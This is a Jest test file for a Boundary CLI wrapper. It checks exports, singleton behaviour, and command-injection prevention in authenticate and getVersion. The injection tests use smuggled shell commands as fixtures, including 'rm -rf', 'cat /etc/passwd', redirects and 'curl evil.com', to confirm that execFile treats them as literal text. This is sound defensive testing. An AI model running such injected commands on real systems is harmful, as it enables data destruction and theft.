/**
 * Unit tests for BoundaryCLI
 *
 * Note: Some query methods (listScopes, listTargets, listAuthMethods, authorizeSession)
 * now use the HTTP API directly for performance. These are tested in api.test.ts.
 * CLI tests focus on methods that still use the CLI: authenticate, connect, getToken, etc.
 */

// Create a mock for the promisified exec function
const mockExecAsync = jest.fn();
const mockExecFileAsync = jest.fn();

// Mock the BoundaryAPI class
const mockApiListScopes = jest.fn();
const mockApiListTargets = jest.fn();
const mockApiListAuthMethods = jest.fn();
const mockApiAuthorizeSession = jest.fn();
const mockApiSetToken = jest.fn();

jest.mock('../../../src/boundary/api', () => ({
  BoundaryAPI: jest.fn().mockImplementation(() => ({
    listScopes: mockApiListScopes,
    listTargets: mockApiListTargets,
    listAuthMethods: mockApiListAuthMethods,
    authorizeSession: mockApiAuthorizeSession,
    setToken: mockApiSetToken,
  })),
}));

// Mock child_process before importing the module under test
jest.mock('child_process', () => {
  const actualChildProcess = jest.requireActual('child_process');
  const mockExec = jest.fn();
  const mockExecFile = jest.fn();
  const mockSpawn = jest.fn();

  return {
    ...actualChildProcess,
    exec: mockExec,
    execFile: mockExecFile,
    spawn: mockSpawn,
  };
});

// Mock the util module to return our mock functions when promisify is called
jest.mock('util', () => {
  const actualUtil = jest.requireActual('util');
  const childProcess = require('child_process');

  return {
    ...actualUtil,
    promisify: jest.fn((fn) => {
      // When promisify is called on exec, return our mock
      if (fn === childProcess.exec) {
        return mockExecAsync;
      }
      // When promisify is called on execFile, return our mock
      if (fn === childProcess.execFile) {
        return mockExecFileAsync;
      }
      // For other functions, use the real promisify
      return actualUtil.promisify(fn);
    }),
  };
});

describe('BoundaryCLI', () => {
  describe('module exports', () => {
    it('should export BoundaryCLI class', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      expect(typeof BoundaryCLI).toBe('function');
    });

    it('should export getBoundaryCLI function', () => {
      const { getBoundaryCLI } = require('../../../src/boundary/cli');
      expect(typeof getBoundaryCLI).toBe('function');
    });

    it('should export disposeBoundaryCLI function', () => {
      const { disposeBoundaryCLI } = require('../../../src/boundary/cli');
      expect(typeof disposeBoundaryCLI).toBe('function');
    });
  });

  describe('BoundaryCLI instance', () => {
    it('should create a BoundaryCLI instance', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(cli).toBeInstanceOf(BoundaryCLI);
    });

    it('should have checkInstalled method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.checkInstalled).toBe('function');
    });

    it('should have authenticate method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.authenticate).toBe('function');
    });

    it('should have listTargets method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.listTargets).toBe('function');
    });

    it('should have listAuthMethods method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.listAuthMethods).toBe('function');
    });

    it('should have connect method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.connect).toBe('function');
    });

    it('should have getVersion method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.getVersion).toBe('function');
    });

    it('should have getToken method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.getToken).toBe('function');
    });

    it('should have listScopes method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.listScopes).toBe('function');
    });

    it('should have authorizeSession method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.authorizeSession).toBe('function');
    });

    it('should have killProcess method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.killProcess).toBe('function');
    });

    it('should have killAllProcesses method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.killAllProcesses).toBe('function');
    });

    it('should have dispose method', () => {
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      const cli = new BoundaryCLI();
      expect(typeof cli.dispose).toBe('function');
    });
  });

  describe('singleton behavior', () => {
    beforeEach(() => {
      // Reset the singleton between tests
      const { disposeBoundaryCLI } = require('../../../src/boundary/cli');
      disposeBoundaryCLI();
    });

    it('should return same instance from getBoundaryCLI', () => {
      const { getBoundaryCLI } = require('../../../src/boundary/cli');
      const cli1 = getBoundaryCLI();
      const cli2 = getBoundaryCLI();
      expect(cli1).toBe(cli2);
    });

    it('should create new instance after dispose', () => {
      const { getBoundaryCLI, disposeBoundaryCLI } = require('../../../src/boundary/cli');
      const cli1 = getBoundaryCLI();
      disposeBoundaryCLI();
      const cli2 = getBoundaryCLI();
      expect(cli1).not.toBe(cli2);
    });
  });

  describe('command injection prevention', () => {
    let cli: any;

    beforeEach(() => {
      // Clear all mocks
      jest.clearAllMocks();

      // Setup default mock implementations for the promisified exec
      mockExecAsync.mockImplementation(async (cmd: string, options?: any) => {
        return { stdout: '{"items":[]}', stderr: '' };
      });

      mockExecFileAsync.mockImplementation(async (file: string, args?: string[], options?: any) => {
        return { stdout: '{"items":[]}', stderr: '' };
      });

      // Create a fresh CLI instance
      const { BoundaryCLI } = require('../../../src/boundary/cli');
      cli = new BoundaryCLI();
    });

    afterEach(() => {
      if (cli) {
        cli.dispose();
      }
    });

    describe('shell metacharacter injection in arguments', () => {
      // Note: listAuthMethods, listScopes, listTargets, and authorizeSession now use the HTTP API
      // instead of CLI. These tests focus on CLI-based methods (authenticate, getToken, connect).

      it('should not execute command substitution with $() in auth method ID', async () => {
        const maliciousAuthMethodId = 'ampw_test$(whoami)';

        // Mock successful execution
        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: maliciousAuthMethodId,
            loginName: 'testuser',
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable, injection should not happen
        }

        // Verify execFile was called (secure implementation)
        expect(mockExecFileAsync).toHaveBeenCalled();

        // Get the arguments that were passed
        const callArgs = mockExecFileAsync.mock.calls[0];
        const cliPath = callArgs[0];
        const argsArray = callArgs[1];

        // Arguments should be passed as array (prevents shell interpretation)
        expect(Array.isArray(argsArray)).toBe(true);
        // The malicious string should be passed as a literal argument
        expect(argsArray).toContain(maliciousAuthMethodId);
        // Verify not using string concatenation
        expect(typeof cliPath).toBe('string');
      });

      it('should not execute command substitution with backticks in auth method ID', async () => {
        const maliciousAuthMethodId = 'ampw_test`id`';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: maliciousAuthMethodId,
            loginName: 'testuser',
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const argsArray = callArgs[1];

        // Arguments passed as array - backticks are literal
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray).toContain(maliciousAuthMethodId);
      });

      it('should not interpret semicolon as command separator in login name', async () => {
        const maliciousLoginName = 'user; rm -rf /tmp/test';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const argsArray = callArgs[1];

        // Semicolon is treated as literal part of argument
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray).toContain(maliciousLoginName);
      });

      it('should not interpret pipe as command chaining in login name', async () => {
        const maliciousLoginName = 'user | cat /etc/passwd';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const argsArray = callArgs[1];

        // Pipe is treated as literal part of argument
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray).toContain(maliciousLoginName);
      });

      it('should not execute redirect operators in auth method ID', async () => {
        const maliciousId = 'ampw_test > /tmp/pwned';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: maliciousId,
            loginName: 'testuser',
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const argsArray = callArgs[1];

        // Redirect operators are literal
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray).toContain(maliciousId);
      });

      it('should not execute ampersand background operator in login name', async () => {
        const maliciousLoginName = 'user & curl evil.com';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const argsArray = callArgs[1];

        // Ampersand is literal
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray).toContain(maliciousLoginName);
      });
    });

    describe('password injection via executeWithPassword', () => {
      it('should not execute shell commands in password field', async () => {
        const maliciousPassword = 'pass$(curl evil.com)';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({
            token: 'test-token',
            status: 'success',
          }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_test',
            loginName: 'testuser',
            password: maliciousPassword,
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();

        // Verify password was passed via environment variable
        const callArgs = mockExecFileAsync.mock.calls[0];
        const options = callArgs[2]; // execFile: (file, args, options)

        // Password should be in env var, not in command string
        expect(options.env?.BOUNDARY_AUTHENTICATE_PASSWORD_PASSWORD).toBe(maliciousPassword);

        // Arguments should be passed as array (prevents shell interpretation)
        const argsArray = callArgs[1];
        expect(Array.isArray(argsArray)).toBe(true);
        // Password should NOT appear in argument array - it's passed via env var
        expect(argsArray.join(' ')).not.toContain(maliciousPassword);
      });

      it('should not execute backticks in password field', async () => {
        const maliciousPassword = 'pass`whoami`';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({
            token: 'test-token',
            status: 'success',
          }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_test',
            loginName: 'testuser',
            password: maliciousPassword,
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const options = callArgs[2];

        // Password should be in env var
        expect(options.env?.BOUNDARY_AUTHENTICATE_PASSWORD_PASSWORD).toBe(maliciousPassword);

        // Arguments should be array, not containing password
        const argsArray = callArgs[1];
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray.join(' ')).not.toContain(maliciousPassword);
      });

      it('should handle special characters in login name safely', async () => {
        const maliciousLoginName = 'admin$(curl evil.com)';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({
            token: 'test-token',
            status: 'success',
          }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_test',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const argsArray = callArgs[1];

        // Login name should be passed as literal argument (no shell interpretation)
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray).toContain(maliciousLoginName);
      });
    });

    describe('injection in various ID types', () => {
      // Note: listAuthMethods, listTargets, authorizeSession, and listScopes now use the HTTP API
      // instead of CLI. Input validation for these is tested in api.test.ts.
      // The following tests verify CLI-based methods handle malicious input safely.

      it('should handle malicious auth method IDs in authenticate', async () => {
        const maliciousAuthMethodId = 'ampw_$(whoami)';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({
            token: 'test-token',
            status: 'success',
          }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: maliciousAuthMethodId,
            loginName: 'testuser',
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        const argsArray = callArgs[1];
        expect(Array.isArray(argsArray)).toBe(true);
        expect(argsArray).toContain(maliciousAuthMethodId);
      });
    });

    describe('argument array vs string concatenation', () => {
      it('should use execFile with argument array for authenticate (secure implementation)', async () => {
        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: 'testuser',
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        // Secure implementation uses execFile with argument array
        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];

        // First argument should be a string (the CLI executable path)
        expect(typeof callArgs[0]).toBe('string');

        // Second argument should be an array (arguments passed separately)
        expect(Array.isArray(callArgs[1])).toBe(true);

        // This demonstrates the secure pattern: arguments are passed as array
        // which prevents shell interpretation of special characters
      });

      it('should pass malicious input as literal argument in authenticate (secure)', async () => {
        // This test verifies the FIXED implementation handles malicious input safely
        const maliciousLoginName = 'testuser$(whoami)';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];

        // When execFile is called with argument array:
        // - First arg: executable path (string)
        // - Second arg: array of arguments (NOT concatenated string)
        // - Third arg: options
        expect(typeof callArgs[0]).toBe('string');
        expect(Array.isArray(callArgs[1])).toBe(true);

        // The malicious input is treated as literal text, not shell command
        expect(callArgs[1]).toContain(maliciousLoginName);
      });
    });

    describe('environment variable injection', () => {
      it('should handle malicious BOUNDARY_ADDR configuration', async () => {
        // Mock configuration service to return malicious addr
        const maliciousAddr = 'https://boundary.local; curl evil.com';

        // This should be sanitized at the configuration level
        // But we test that it doesn't cause command injection
        mockExecFileAsync.mockResolvedValueOnce({
          stdout: 'Version 0.14.0',
          stderr: '',
        });

        try {
          await cli.getVersion();
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        // Environment variables are passed in options, not interpolated in command
        expect(Array.isArray(callArgs[1])).toBe(true);
      });
    });

    describe('null byte injection', () => {
      it('should handle null bytes in arguments', async () => {
        const maliciousLoginName = 'test\x00-ignored';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        expect(Array.isArray(callArgs[1])).toBe(true);
        expect(callArgs[1]).toContain(maliciousLoginName);
      });
    });

    describe('newline injection', () => {
      it('should handle newlines in arguments', async () => {
        const maliciousLoginName = 'test\ncurl evil.com';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        expect(Array.isArray(callArgs[1])).toBe(true);
        expect(callArgs[1]).toContain(maliciousLoginName);
      });
    });

    describe('glob pattern injection', () => {
      it('should handle glob patterns in arguments', async () => {
        const maliciousLoginName = 'test*';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        expect(Array.isArray(callArgs[1])).toBe(true);
        // Glob is passed as literal, not expanded
        expect(callArgs[1]).toContain(maliciousLoginName);
      });
    });

    describe('unicode and encoding attacks', () => {
      it('should handle unicode characters in arguments', async () => {
        const maliciousLoginName = 'test\u0000\u0001\u0002';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        expect(Array.isArray(callArgs[1])).toBe(true);
        expect(callArgs[1]).toContain(maliciousLoginName);
      });

      it('should handle ANSI escape sequences in arguments', async () => {
        const maliciousLoginName = 'test\x1b[0m\x1b[31m';

        mockExecFileAsync.mockResolvedValueOnce({
          stdout: JSON.stringify({ token: 'test', status: 'success' }),
          stderr: '',
        });

        try {
          await cli.authenticate('password', {
            authMethodId: 'ampw_123',
            loginName: maliciousLoginName,
            password: 'password123',
          });
        } catch (error) {
          // Error is acceptable
        }

        expect(mockExecFileAsync).toHaveBeenCalled();
        const callArgs = mockExecFileAsync.mock.calls[0];
        expect(Array.isArray(callArgs[1])).toBe(true);
        expect(callArgs[1]).toContain(maliciousLoginName);
      });
    });
  });
});
